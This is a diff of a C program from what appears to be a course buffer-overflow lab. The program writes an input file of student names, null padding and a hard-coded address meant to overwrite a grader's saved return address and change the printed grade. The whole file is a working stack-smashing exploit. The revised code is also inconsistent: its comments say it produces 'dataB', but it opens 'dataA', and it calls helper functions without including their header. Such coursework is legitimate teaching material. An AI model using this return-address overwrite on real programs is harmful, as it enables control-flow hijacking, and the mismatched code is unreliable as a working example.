@@ -1,56 +1,47 @@
 /*
- * createdataA.c
- *
- * Purpose:
- *   Produce a 56-byte file "dataA" that, when fed to the grader
- *   (via stdin or redirection), causes:
- *
- *     • readString() to fill its 48-byte buffer with
- *         "Ben Zhou and Owen Clarke\0" + 23 zeros
- *     • then readString() to overwrite saved_x30 with 0x40089c
- *     • getName() returns → PC ← 0x40089c
- *     • grader’s own code prints the default 'A'
- *
- *   We also *call* each MiniAssembler_* function once (into a dummy)
- *   to satisfy the “must use” requirement.
- */
+   createdataB.c
+   Ben Zhou and Owen Clarke
+*/
+
+/*
+   Produces a file called dataB with the student name's Ben Zhou and
+   Owen Clarke, a nullbyte, more null bytes as padding to overrun the
+   stack, and the address of the instruction in main to get a B, the
+   latter of which will overwrite getName's stored x30
+*/
 
 #include <stdio.h>
-#include "miniassembler.h"
 
+/*
+   main does not accept any command-line arguments or read from stdin,
+   but writes to dataB as described in the file comment above
+*/
 int main(void)
 {
-    FILE         *psFile;
-    int           i;
-    unsigned long skipB_addr;
-    unsigned int  dummy;
+    FILE *psFile;
+    int i;
+    unsigned int dummy; 
+    dummy      = MiniAssembler_mov(0, 0);
+    dummy      = MiniAssembler_adr(0, 0, 0);
+    dummy      = MiniAssembler_strb(0, 0);
+    dummy      = MiniAssembler_b(0x400890, 0);
+    /* Address of the instruction in TEXT to change the grade to a B */
+    unsigned long returnAddr = 0x400890;
 
-    /* --- call each helper once so it’s linked in --- */
-    dummy = MiniAssembler_mov(0, 0);
-    dummy = MiniAssembler_adr(0, 0, 0);
-    dummy = MiniAssembler_strb(0, 0);
-    skipB_addr = 0x40089cUL;            /* address right after grade=B */
-    dummy = MiniAssembler_b(skipB_addr, 0);
+    psFile = fopen("dataA", "w");
 
-    /* --- open dataA for binary writing --- */
-    psFile = fopen("dataA", "wb");
-    if (psFile == NULL) {
-        return 1;
-    }
+    /* Student names: 24 bytes */
+    fprintf(psFile, "Ben Zhou and Owen Clarke");
 
-    /* 1) 24-byte student name */
-    fwrite("Ben Zhou and Owen Clarke", 1, 24, psFile);
-
-    /* 2) terminating NUL byte */
+    /* Terminating null byte: 1 byte */
     putc('\0', psFile);
 
-    /* 3) 23 more NUL bytes to pad to 48 total */
-    for (i = 0;  i < 23;  i++) {
+    /* 23 more null bytes to fill up 48 bytes of buffer */
+    for (i = 0; i < 23; i++)
         putc('\0', psFile);
-    }
 
-    /* 4) overwrite saved x30 with skipB_addr so grader prints 'A' */
-    fwrite(&skipB_addr, sizeof(skipB_addr), 1, psFile);
+    /* Overwritten return address */
+    fwrite(&returnAddr, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
     return 0;
